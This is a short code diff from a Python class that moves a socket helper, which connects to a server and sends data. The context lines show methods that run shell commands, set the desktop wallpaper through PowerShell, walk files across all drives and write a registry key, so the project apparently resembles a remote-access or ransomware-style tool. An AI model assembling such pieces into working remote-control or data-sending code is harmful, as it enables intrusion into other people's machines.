@@ -90,7 +90,18 @@ Set-WallPaper("""+path_file+""")
     
     async def run_command(self , command) -> str:
         return subprocess.getoutput(command)
-    
+
+    async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket: 
+         sock = socket.socket() 
+         try: 
+             sock.connect((server_address , port_address)) 
+             sock.send(data) 
+             return sock 
+         except Exception: 
+             raise Exception("Connection is not possible")     
+         except: 
+             return False
+
     async def get_files(self) -> list:
         try:
             for drive in await self.get_drives():
@@ -147,14 +158,4 @@ Set-WallPaper("""+path_file+""")
         except WindowsError:
             raise WindowsError("There was an error setting the registry key")   
  
-    async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket: 
-         sock = socket.socket()  
-         try: 
-             sock.connect((server_address , port_address)) 
-             sock.send(data) 
-             return sock 
-         except Exception: 
-             raise Exception("Connection is not possible")     
-         except: 
-             return False
-        
+ 
